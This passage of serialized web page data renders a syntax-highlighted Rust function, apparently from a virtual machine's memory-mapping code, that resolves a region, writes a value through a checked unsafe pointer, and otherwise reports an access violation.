token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n5"])</script><script>self.__next_f.push([1,"ac:[\"$\",\"span\",\"code-segment-568\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\n5ad:[\"$\",\"span\",\"code-segment-569\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" _ \"]}]\n5ae:[\"$\",\"span\",\"code-segment-570\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n5af:[\"$\",\"span\",\"code-segment-571\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5b0:[\"$\",\"span\",\"code-segment-572\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n5b1:[\"$\",\"span\",\"code-segment-573\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\n5b2:[\"$\",\"span\",\"code-segment-574\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5b3:[\"$\",\"span\",\"code-segment-575\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n5b4:[\"$\",\"span\",\"code-segment-576\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n5b5:[\"$\",\"span\",\"code-segment-577\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n5b6:[\"$\",\"span\",\"line-number--54\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[54]}]\n5b7:[\"$\",\"span\",\"line-number--55\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[55]}]\n5b8:[\"$\",\"span\",\"code-segment-581\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n5b9:[\"$\",\"span\",\"code-segment-582\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n5ba:[\"$\",\"span\",\"code-segment-583\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5bb:[\"$\",\"span\",\"code-segment-584\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"ch"])</script><script>self.__next_f.push([1,"ildren\":[\"mut\"]}]\n5bc:[\"$\",\"span\",\"code-segment-585\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region \"]}]\n5bd:[\"$\",\"span\",\"code-segment-586\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n5be:[\"$\",\"span\",\"code-segment-587\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5bf:[\"$\",\"span\",\"code-segment-588\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"match\"]}]\n5c0:[\"$\",\"span\",\"code-segment-589\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5c1:[\"$\",\"span\",\"code-segment-590\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n5c2:[\"$\",\"span\",\"code-segment-591\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n5c3:[\"$\",\"span\",\"code-segment-592\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"find_region\"]}]\n5c4:[\"$\",\"span\",\"code-segment-593\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n5c5:[\"$\",\"span\",\"code-segment-594\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cache\"]}]\n5c6:[\"$\",\"span\",\"code-segment-595\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n5c7:[\"$\",\"span\",\"code-segment-596\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}]\n5c8:[\"$\",\"span\",\"code-segment-597\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n5c9:[\"$\",\"span\",\"code-segment-598\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5ca:[\"$\",\"span\",\"code-segment-599\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n5cb:[\"$\",\"span\",\"code-segment-600\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n5cc:[\"$\",\"span\",\"line-number--56\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[56]}]\n5cd:[\"$\",\"span\",\"code-segment-602\",{\"className\":\"$undefined\",\"style\":{},\"chil"])</script><script>self.__next_f.push([1,"dren\":[\"            \"]}]\n5ce:[\"$\",\"span\",\"code-segment-603\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}]\n5cf:[\"$\",\"span\",\"code-segment-604\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n5d0:[\"$\",\"span\",\"code-segment-605\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n5d1:[\"$\",\"span\",\"code-segment-606\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n5d2:[\"$\",\"span\",\"code-segment-607\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5d3:[\"$\",\"span\",\"code-segment-608\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n5d4:[\"$\",\"span\",\"code-segment-609\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5d5:[\"$\",\"span\",\"code-segment-610\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"ensure_writable_region\"]}]\n5d6:[\"$\",\"span\",\"code-segment-611\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n5d7:[\"$\",\"span\",\"code-segment-612\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n5d8:[\"$\",\"span\",\"code-segment-613\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n5d9:[\"$\",\"span\",\"code-segment-614\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5da:[\"$\",\"span\",\"code-segment-615\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n5db:[\"$\",\"span\",\"code-segment-616\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n5dc:[\"$\",\"span\",\"code-segment-617\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n5dd:[\"$\",\"span\",\"code-segment-618\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cow_cb\"]}]\n5de:[\"$\",\"span\",\"code-segment-619\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n5df:[\"$\",\"span\",\"code-segment-620\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5e0:[\"$\",\"span\",\"code-segment-621\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\n5e1:[\"$\",\"span\",\"code-segment-622\",{\"className\":\"$un"])</script><script>self.__next_f.push([1,"defined\",\"style\":{},\"children\":[\" \"]}]\n5e2:[\"$\",\"span\",\"code-segment-623\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n5e3:[\"$\",\"span\",\"code-segment-624\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n5e4:[\"$\",\"span\",\"line-number--57\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[57]}]\n5e5:[\"$\",\"span\",\"code-segment-626\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n5e6:[\"$\",\"span\",\"code-segment-627\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// fast path\"]}]\n5e7:[\"$\",\"span\",\"code-segment-628\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n5e8:[\"$\",\"span\",\"line-number--58\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[58]}]\n5e9:[\"$\",\"span\",\"code-segment-630\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n5ea:[\"$\",\"span\",\"code-segment-631\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n5eb:[\"$\",\"span\",\"code-segment-632\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5ec:[\"$\",\"span\",\"code-segment-633\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n5ed:[\"$\",\"span\",\"code-segment-634\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5ee:[\"$\",\"span\",\"code-segment-635\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}]\n5ef:[\"$\",\"span\",\"code-segment-636\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n5f0:[\"$\",\"span\",\"code-segment-637\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\n5f1:[\"$\",\"span\",\"code"])</script><script>self.__next_f.push([1,"-segment-638\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n5f2:[\"$\",\"span\",\"code-segment-639\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}]\n5f3:[\"$\",\"span\",\"code-segment-640\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n5f4:[\"$\",\"span\",\"code-segment-641\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5f5:[\"$\",\"span\",\"code-segment-642\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n5f6:[\"$\",\"span\",\"code-segment-643\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region\"]}]\n5f7:[\"$\",\"span\",\"code-segment-644\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n5f8:[\"$\",\"span\",\"code-segment-645\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"vm_to_host\"]}]\n5f9:[\"$\",\"span\",\"code-segment-646\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n5fa:[\"$\",\"span\",\"code-segment-647\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_addr\"]}]\n5fb:[\"$\",\"span\",\"code-segment-648\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n5fc:[\"$\",\"span\",\"code-segment-649\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len\"]}]\n5fd:[\"$\",\"span\",\"code-segment-650\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n5fe:[\"$\",\"span\",\"code-segment-651\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n5ff:[\"$\",\"span\",\"code-segment-652\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n600:[\"$\",\"span\",\"code-segment-653\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n601:[\"$\",\"span\",\"line-number--59\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[59]}]\n602:[\"$\",\"span\",\"code-segment-655\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n603:[\"$\",\"span\""])</script><script>self.__next_f.push([1,",\"code-segment-656\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Safety:\"]}]\n604:[\"$\",\"span\",\"code-segment-657\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n605:[\"$\",\"span\",\"line-number--60\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[60]}]\n606:[\"$\",\"span\",\"code-segment-659\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n607:[\"$\",\"span\",\"code-segment-660\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// vm_to_host() succeeded so we know there's enough space to\"]}]\n608:[\"$\",\"span\",\"code-segment-661\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n609:[\"$\",\"span\",\"line-number--61\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[61]}]\n60a:[\"$\",\"span\",\"code-segment-663\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n60b:[\"$\",\"span\",\"code-segment-664\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// store `value`\"]}]\n60c:[\"$\",\"span\",\"code-segment-665\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n60d:[\"$\",\"span\",\"line-number--62\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[62]}]\n60e:[\"$\",\"span\",\"code-segment-667\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n60f:[\"$\",\"span\",\"code-segment-668\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}]\n"])</script><script>self.__next_f.push([1,"610:[\"$\",\"span\",\"code-segment-669\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n611:[\"$\",\"span\",\"code-segment-670\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n612:[\"$\",\"span\",\"code-segment-671\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n613:[\"$\",\"span\",\"code-segment-672\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"ptr\"]}]\n614:[\"$\",\"span\",\"code-segment-673\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n615:[\"$\",\"span\",\"code-segment-674\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"write_unaligned\"]}]\n616:[\"$\",\"span\",\"code-segment-675\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n617:[\"$\",\"span\",\"code-segment-676\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr \"]}]\n618:[\"$\",\"span\",\"code-segment-677\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n619:[\"$\",\"span\",\"code-segment-678\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n61a:[\"$\",\"span\",\"code-segment-679\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n61b:[\"$\",\"span\",\"code-segment-680\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n61c:[\"$\",\"span\",\"code-segment-681\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" _\"]}]\n61d:[\"$\",\"span\",\"code-segment-682\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n61e:[\"$\",\"span\",\"code-segment-683\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" value\"]}]\n61f:[\"$\",\"span\",\"code-segment-684\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n620:[\"$\",\"span\",\"code-segment-685\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n621:[\"$\",\"span\",\"code-segment-686\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n622:[\"$\",\"span\",\"code-segment-687\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n623:[\"$\",\"span\",\"code-segment-688\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]"])</script><script>self.__next_f.push([1,"}]\n624:[\"$\",\"span\",\"line-number--63\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[63]}]\n625:[\"$\",\"span\",\"code-segment-690\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\n626:[\"$\",\"span\",\"code-segment-691\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}]\n627:[\"$\",\"span\",\"code-segment-692\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n628:[\"$\",\"span\",\"code-segment-693\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}]\n629:[\"$\",\"span\",\"code-segment-694\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n62a:[\"$\",\"span\",\"code-segment-695\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\n62b:[\"$\",\"span\",\"code-segment-696\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n62c:[\"$\",\"span\",\"code-segment-697\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}]\n62d:[\"$\",\"span\",\"code-segment-698\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n62e:[\"$\",\"span\",\"code-segment-699\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n62f:[\"$\",\"span\",\"code-segment-700\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n630:[\"$\",\"span\",\"line-number--64\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[64]}]\n631:[\"$\",\"span\",\"code-segment-702\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n632:[\"$\",\"span\",\"code-segment-703\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n633:[\"$\",\"span\",\"code-segment-704\",{\"classN"])</script><script>self.__next_f.push([1,"ame\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n634:[\"$\",\"span\",\"line-number--65\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[65]}]\n635:[\"$\",\"span\",\"line-number--66\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[66]}]\n636:[\"$\",\"span\",\"code-segment-708\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n637:[\"$\",\"span\",\"code-segment-709\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n638:[\"$\",\"span\",\"code-segment-710\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n639:[\"$\",\"span\",\"line-number--67\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[67]}]\n63a:[\"$\",\"span\",\"code-segment-712\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            _ \"]}]\n63b:[\"$\",\"span\",\"code-segment-713\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\n63c:[\"$\",\"span\",\"code-segment-714\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n63d:[\"$\",\"span\",\"code-segment-715\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n63e:[\"$\",\"span\",\"code-segment-716\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n63f:[\"$\",\"span\",\"line-number--68\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rg"])</script><script>self.__next_f.push([1,"ba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[68]}]\n640:[\"$\",\"span\",\"code-segment-718\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n641:[\"$\",\"span\",\"code-segment-719\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}]\n642:[\"$\",\"span\",\"code-segment-720\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n643:[\"$\",\"span\",\"code-segment-721\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"generate_access_violation\"]}]\n644:[\"$\",\"span\",\"code-segment-722\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n645:[\"$\",\"span\",\"code-segment-723\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n646:[\"$\",\"span\",\"code-segment-724\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n647:[\"$\",\"span\",\"code-segment-725\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"config\"]}]\n648:[\"$\",\"span\",\"code-segment-726\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n649:[\"$\",\"span\",\"code-segment-727\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n64a:[\"$\",\"span\",\"code-segment-728\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccessType\"]}]\n64b:[\"$\",\"span\",\"code-segment-729\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n64c:[\"$\",\"span\",\"code-segment-730\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Store\"]}]\n64d:[\"$\",\"span\",\"code-segment-731\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n64e:[\"$\",\"span\",\"code-segment-732\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}]\n64f:[\"$\",\"span\",\"code-segment-733\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n650:[\"$\",\"span\",\"code-segment-734\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len\"]}]\n651:[\"$\",\"span\",\"code-segment-735\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n652:[\"$\",\"span\",\"code-segment-736\",{\"className\":\"$undefined\",\"style\":{},\"childr"])</script><script>self.__next_f.push([1,"en\":[\" pc\"]}]\n653:[\"$\",\"span\",\"code-segment-737\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n654:[\"$\",\"span\",\"code-segment-738\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n655:[\"$\",\"span\",\"line-number--69\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[69]}]\n656:[\"$\",\"span\",\"code-segment-740\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n657:[\"$\",\"span\",\"code-segment-741\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n658:[\"$\",\"span\",\"code-segment-742\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n659:[\"$\",\"span\",\"line-number--70\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[70]}]\n65a:[\"$\",\"span\",\"code-segment-744\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n65b:[\"$\",\"span\",\"code-segment-745\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n65c:[\"$\",\"span\",\"code-segment-746\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n65d:[\"$\",\"span\",\"code-segment-747\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n65e:[\"$\",\"span\",\"line-number--71\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[71]}]\n65f:[\"$\",\"span\",\"line-number--72\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\","])</script><script>self.__next_f.push([1,"\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid 